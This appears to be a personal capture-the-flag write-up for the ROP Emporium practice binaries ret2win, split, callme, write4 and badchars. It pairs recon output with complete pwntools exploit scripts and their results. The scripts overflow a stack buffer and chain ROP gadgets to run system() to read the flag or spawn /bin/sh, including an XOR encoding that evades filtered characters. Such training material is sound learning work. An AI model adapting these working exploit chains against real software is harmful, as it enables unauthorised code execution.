# Rop Emporium

## Tools
Rabin2\
R2 - izz\
Gdb - info functions\
objdump\
ROPGadget

## 0) Ret2win

### GDB function
```
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  puts@plt
0x00000000004005e0  system@plt
0x00000000004005f0  printf@plt
0x0000000000400600  memset@plt
0x0000000000400610  __libc_start_main@plt
0x0000000000400620  fgets@plt
0x0000000000400630  setvbuf@plt
0x0000000000400640  __gmon_start__@plt
0x0000000000400650  _start
0x0000000000400680  deregister_tm_clones
0x00000000004006c0  register_tm_clones
0x0000000000400700  __do_global_dtors_aux
0x0000000000400720  frame_dummy
0x0000000000400746  main
0x00000000004007b5  pwnme
0x0000000000400811  ret2win
0x0000000000400840  __libc_csu_init
0x00000000004008b0  __libc_csu_fini
0x00000000004008b4  _fini
gdb-peda$ 
```
### NM
```
[root:~/Downloads/RopEmporium]# nm ret2win|grep ' t '
0000000000400680 t deregister_tm_clones
0000000000400700 t __do_global_dtors_aux
0000000000400720 t frame_dummy
00000000004007b5 t pwnme
00000000004006c0 t register_tm_clones
0000000000400811 t ret2win
```
### Exploit
```
# Import the library
from pwn import *

# Debugging
# context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("ret2win")

# Variables
pwnme_symbol = p64(elf.symbols["ret2win"])

# Pack the arguments for the functions we want to call
payload = "a" * 40
payload += pwnme_symbol

io = elf.process()
# gdb.attach(io)
# https://c9x.me/x86/
io.sendline(payload)
data = io.recvall()
print(data)
```
### Result
```
[root:~/Downloads/RopEmporium]# python exploit-ret2win-x64.py
[*] '/root/Downloads/RopEmporium/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/RopEmporium/ret2win': pid 5018
[+] Receiving all data: Done (322B)
[*] Process '/root/Downloads/RopEmporium/ret2win' stopped with exit code -11 (SIGSEGV) (pid 5018)
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```

## 1) Split

### Rabin2
```
[root:~/Downloads/RopEmporium]# rabin2 -I split
arch     x86
baddr    0x400000
binsz    7137
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```
### GDB functions
```
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  puts@plt
0x00000000004005e0  system@plt
0x00000000004005f0  printf@plt
0x0000000000400600  memset@plt
0x0000000000400610  __libc_start_main@plt
0x0000000000400620  fgets@plt
0x0000000000400630  setvbuf@plt
0x0000000000400640  __gmon_start__@plt
0x0000000000400650  _start
0x0000000000400680  deregister_tm_clones
0x00000000004006c0  register_tm_clones
0x0000000000400700  __do_global_dtors_aux
0x0000000000400720  frame_dummy
0x0000000000400746  main
0x00000000004007b5  pwnme
0x0000000000400807  usefulFunction
0x0000000000400820  __libc_csu_init
0x0000000000400890  __libc_csu_fini
0x0000000000400894  _fini
```
### NM
```
[root:~/Downloads/RopEmporium]# nm split | grep ' t '
0000000000400680 t deregister_tm_clones
0000000000400700 t __do_global_dtors_aux
0000000000400720 t frame_dummy
00000000004007b5 t pwnme
00000000004006c0 t register_tm_clones
0000000000400807 t usefulFunction
```
### Analysis
A function exists called usefulFunction, but the string moved into edi is '/bin/ls'
```
gdb-peda$ pdis *usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400807 <+0>:     push   rbp
   0x0000000000400808 <+1>:     mov    rbp,rsp
   0x000000000040080b <+4>:     mov    edi,0x4008ff
   0x0000000000400810 <+9>:     call   0x4005e0 <system@plt>
   0x0000000000400815 <+14>:    nop
   0x0000000000400816 <+15>:    pop    rbp
   0x0000000000400817 <+16>:    ret    
End of assembler dump.
gdb-peda$ x/s 0x4008ff
0x4008ff:       "/bin/ls"
gdb-peda$ 
```
### R2 izz
```
036 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt    
```
### GDB string
```
0x601060 <usefulString>:        "/bin/cat flag.txt"                                                
0x601072 <usefulString+18>:     ""
0x601073 <usefulString+19>:     ""
0x601074 <usefulString+20>:     ""         
0x601075 <usefulString+21>:     ""
0x601076 <usefulString+22>:     ""
0x601077 <usefulString+23>:     ""
0x601078 <usefulString+24>:     ""
0x601079 <usefulString+25>:     ""                             
```
### Exploit
```
# Import the library
from pwn import *

# Debugging
context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("split")

# Variables
usefulFunction = p64(0x400810)
usefulString = p64(elf.symbols["usefulString"])
poprdi = p64(0x0000000000400883)

# Pack the arguments for the functions we want to call
payload = "a" * 40
payload += poprdi
payload += usefulString
payload += usefulFunction

io = elf.process()
gdb.attach(io)
io.sendline(payload)
data = io.recvall()
print(data)
```
### Result
```
[root:~/Downloads/RopEmporium]# python exploit-split-x64.py
[*] '/root/Downloads/RopEmporium/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/RopEmporium/split': pid 17865
[+] Receiving all data: Done (109B)
[*] Stopped process '/root/Downloads/RopEmporium/split' (pid 17865)
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> ROPE{a_placeholder_32byte_flag!}
```

## 2) CallMe

### Rabin2
```
[root:~/Downloads/RopEmporium]# rabin2 -I callme    
arch     x86
baddr    0x400000
binsz    11375
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    ./
static   false
stripped false
subsys   linux
va       true
```
### GDB Functions
```
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
0x00000000004017c0  _init
0x00000000004017f0  puts@plt
0x0000000000401800  printf@plt
0x0000000000401810  callme_three@plt
0x0000000000401820  memset@plt
0x0000000000401830  __libc_start_main@plt
0x0000000000401840  fgets@plt
0x0000000000401850  callme_one@plt
0x0000000000401860  setvbuf@plt
0x0000000000401870  callme_two@plt
0x0000000000401880  exit@plt
0x0000000000401890  __gmon_start__@plt
0x00000000004018a0  _start
0x00000000004018d0  deregister_tm_clones
0x0000000000401910  register_tm_clones
0x0000000000401950  __do_global_dtors_aux
0x0000000000401970  frame_dummy
0x0000000000401996  main
0x0000000000401a05  pwnme
0x0000000000401a57  usefulFunction
0x0000000000401ab0  usefulGadgets
0x0000000000401ac0  __libc_csu_init
0x0000000000401b30  __libc_csu_fini
0x0000000000401b34  _fini
pwndbg> 
```
### Exploit
```
# Import the library
from pwn import *

# Debugging
context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("callme")

# Variables
callme_one = p64(elf.symbols["callme_one"])
callme_two = p64(elf.symbols["callme_two"])
callme_three = p64(elf.symbols["callme_three"])
# Pop, pop, pop ret - pops all our arguments onto the stacl
popreg = p64(0x0000000000401ab0)

# Pack the arguments for the functions we want to call
payload = "a" * 40
payload += popreg
payload += p64(0x1)
payload += p64(0x2)
payload += p64(0x3)
payload += callme_one
payload += popreg
payload += p64(0x1)
payload += p64(0x2)
payload += p64(0x3)
payload += callme_two
payload += popreg
payload += p64(0x1)
payload += p64(0x2)
payload += p64(0x3)
payload += callme_three

io = elf.process()
#gdb.attach(io)
# b *pwnme+79
io.sendline(payload)
data = io.recvall()
print(data)
```
### Results
```
[root:~/Downloads/RopEmporium]# python exploit-callme-x64.py
[*] '/root/Downloads/RopEmporium/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    './'
[+] Starting local process '/root/Downloads/RopEmporium/callme': pid 28268
[+] Receiving all data: Done (99B)
[*] Process '/root/Downloads/RopEmporium/callme' stopped with exit code 0 (pid 28268)
callme by ROP Emporium
64bits

Hope you read the instructions...
> ROPE{a_placeholder_32byte_flag!}
```

## 3) Write4

### GDB functions
```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  puts@plt
0x00000000004005e0  system@plt
0x00000000004005f0  printf@plt
0x0000000000400600  memset@plt
0x0000000000400610  __libc_start_main@plt
0x0000000000400620  fgets@plt
0x0000000000400630  setvbuf@plt
0x0000000000400640  __gmon_start__@plt
0x0000000000400650  _start
0x0000000000400680  deregister_tm_clones
0x00000000004006c0  register_tm_clones
0x0000000000400700  __do_global_dtors_aux
0x0000000000400720  frame_dummy
0x0000000000400746  main
0x00000000004007b5  pwnme
0x0000000000400807  usefulFunction
0x0000000000400820  usefulGadgets
0x0000000000400830  __libc_csu_init
0x00000000004008a0  __libc_csu_fini
0x00000000004008a4  _fini
pwndbg> 

```
### NM
```
[root:~/Downloads/RopEmporium]# nm ./write4 | grep ' t '
0000000000400680 t deregister_tm_clones
0000000000400700 t __do_global_dtors_aux
0000000000400720 t frame_dummy
00000000004007b5 t pwnme
00000000004006c0 t register_tm_clones
0000000000400807 t usefulFunction
```
### Rabin2
```
[root:~/Downloads/RopEmporium]# rabin2 -I write4
arch     x86
baddr    0x400000
binsz    7150
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```
### Exploit (launch /bin/sh)
```
# Import the library
from pwn import *

# Debugging
context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("write4")

# Variables
system = p64(elf.symbols["system"])
# Gagdet: 0x0000000000400820 : mov qword ptr [r14], r15 ; ret
movGadget = p64(0x400820)
# Gadget: 0x0000000000400890 : pop r14 ; pop r15 ; ret
popGadget = p64(0x400890)
# Section to write data, readelf -a ./write4;readelf -x .data ./write4
writeWhatWhere = p64(0x601050)
# String to execute with the system function
stringToWrite = "/bin/sh\x00"
# Gadget: 0x0000000000400893 : pop rdi ; ret
poprdi = p64(0x0000000000400893)

# Pack the arguments for the functions we want to call
payload = "a" * 40
payload += popGadget
payload += writeWhatWhere
payload += stringToWrite
payload += movGadget
payload += poprdi
payload += p64(0x601050)

payload += system


io = elf.process()
#gdb.attach(io)
io.sendline(payload)
#data = io.recvall()
#print(data)
#
io.interactive()
```
### Exploit (/bin/cat flag.txt)
```
# Import the library
from pwn import *

# Debugging
# context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("write4")

# Variables
system = p64(elf.symbols["system"])
# Gagdet: 0x0000000000400820 : mov qword ptr [r14], r15 ; ret
movGadget = p64(0x0000000000400820)
# Gadget: 0x0000000000400890 : pop r14 ; pop r15 ; ret
popGadget = p64(0x0000000000400890)
# Section to write data, readelf -a ./write4;readelf -x .data ./write4
writeWhatWhere = p64(0x0000000000601050)
# Gadget: 0x0000000000400893 : pop rdi ; ret
poprdi = p64(0x0000000000400893)

# Pack the arguments for the functions we want to call
payload = "a" * 40

# Write the first 8 bytes
payload += popGadget
payload += p64(0x601050)
payload += "/bin/cat"

# Move the first 8 bytes to the address 0x601050
payload += movGadget

# Write the second 8 bytes
payload += popGadget
payload += p64(0x601058)
payload += " flag.tx"

# Move the second 8 bytes to the address 0x601058
payload += movGadget

# Write the second 8 bytes
payload += popGadget
payload += p64(0x601060)
payload += "t\x00\x00\x00\x00\x00\x00\x00"

# Move the third 8 bytes to the address 0x601060
payload += movGadget

# Pop the address where the string is into RDI
payload += poprdi
payload += p64(0x601050)

# Fire system()
payload += system

io = elf.process()
# gdb.attach(io)
io.sendline(payload)
data = io.recvall()
print(data)
```
### Result
```
[root:~/Downloads/RopEmporium]# python exploit-write4-x64.py
[*] '/root/Downloads/RopEmporium/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/RopEmporium/write4': pid 46943
[+] Receiving all data: Done (107B)
[*] Process '/root/Downloads/RopEmporium/write4' stopped with exit code -11 (SIGSEGV) (pid 46943)
write4 by ROP Emporium
64bits

Go ahead and give me the string already!
> ROPE{a_placeholder_32byte_flag!}
```

## Badchars

### NM
```
[root:~/Downloads/RopEmporium]# nm badchars | grep ' t ' 
0000000000400a40 t checkBadchars
00000000004007c0 t deregister_tm_clones
0000000000400840 t __do_global_dtors_aux
0000000000400860 t frame_dummy
00000000004009f0 t nstrlen
00000000004008f5 t pwnme
0000000000400800 t register_tm_clones
00000000004009df t usefulFunction
```
### GDB info functions
```
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
0x0000000000400698  _init
0x00000000004006d0  free@plt
0x00000000004006e0  puts@plt
0x00000000004006f0  system@plt
0x0000000000400700  printf@plt
0x0000000000400710  memset@plt
0x0000000000400720  __libc_start_main@plt
0x0000000000400730  fgets@plt
0x0000000000400740  memcpy@plt
0x0000000000400750  malloc@plt
0x0000000000400760  setvbuf@plt
0x0000000000400770  exit@plt
0x0000000000400780  __gmon_start__@plt
0x0000000000400790  _start
0x00000000004007c0  deregister_tm_clones
0x0000000000400800  register_tm_clones
0x0000000000400840  __do_global_dtors_aux
0x0000000000400860  frame_dummy
0x0000000000400886  main
0x00000000004008f5  pwnme
0x00000000004009df  usefulFunction
0x00000000004009f0  nstrlen
0x0000000000400a40  checkBadchars
0x0000000000400b30  usefulGadgets
0x0000000000400b50  __libc_csu_init
0x0000000000400bc0  __libc_csu_fini
0x0000000000400bc4  _fini
```
### Exploit (launch /bin/sh)
```
# Import the library
from pwn import *

# Debugging
#context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("badchars")

# Bad chars:
# badchars are: b i c / <space> f n s
badchars = 'bic/ fns'
badchar_hex = [hex(ord(x)) for x in badchars]
# Xord result: ['l', '!', '*', '-', 'l', '0', '+']
xord_string = [chr(ord(x) ^ 0x43) for x in '/bin/sh']
# Reverse result: '/bin/sh'
backtostring = ''.join([chr(ord(x) ^ 0x43) for x in xord_string])

# Variables
# Section to write data, readelf -a ./write4;readelf -x .data ./write4
writeWhatWhere = p64(0x00000000006010d0)

# String to execute with the system function
stringToWrite = "l!*-l0+\x00"

# Pop gadget: 0x0000000000400b3b : pop r12 ; pop r13 ; ret
popGadget = p64(0x0000000000400b3b)

# mov gadget: 0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
movGadget = p64(0x0000000000400b34)

# Xor: 0x400b30 <usefulGadgets>       xor    byte ptr [r15], r14b; ret
xor = p64(0x400b30)

# 0x400b40 <usefulGadgets+16>    pop    r14; pop     r15;    ret
xorpop = p64(0x400b40)

# Poprdi gadget: 0x0000000000400b39 : pop rdi ; ret
poprdiGadget = p64(0x0000000000400b39)

# System function:
system = p64(elf.symbols["system"])


# Generate our payload
#
payload = "a" * 40

# Push our Xor'd payload onto the stack
payload += popGadget
payload += stringToWrite  # r12
payload += writeWhatWhere # r13

# Move it to our memory address
payload += movGadget

# Xor the first char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += writeWhatWhere # r15 the destination address
payload += xor

# Xor the second char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d1) # r15 the destination address
payload += xor

# Xor the third char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d2) # r15 the destination address
payload += xor

# Xor the fourth char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d3) # r15 the destination address
payload += xor

# Xor the fifth char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d4) # r15 the destination address
payload += xor

# Xor the sixth char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d5) # r15 the destination address
payload += xor

# Xor the seventh char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d6) # r15 the destination address
payload += xor

# Pop RDI Gadget and the memory address into registers
payload += poprdiGadget
payload += writeWhatWhere
# Call system with our pointers in the correct registers.
payload += system

io = elf.process()
#gdb.attach(io)
io.sendline(payload)
io.interactive()
```
### Result (launch /bin/sh)
```
[root:~/Downloads/RopEmporium]# python exploit-badchars-x64-binsh.py 
[*] '/root/Downloads/RopEmporium/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/RopEmporium/badchars': pid 17851
[*] Switching to interactive mode
badchars by ROP Emporium
64bits

badchars are: b i c / <space> f n s
> $ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
$  
```
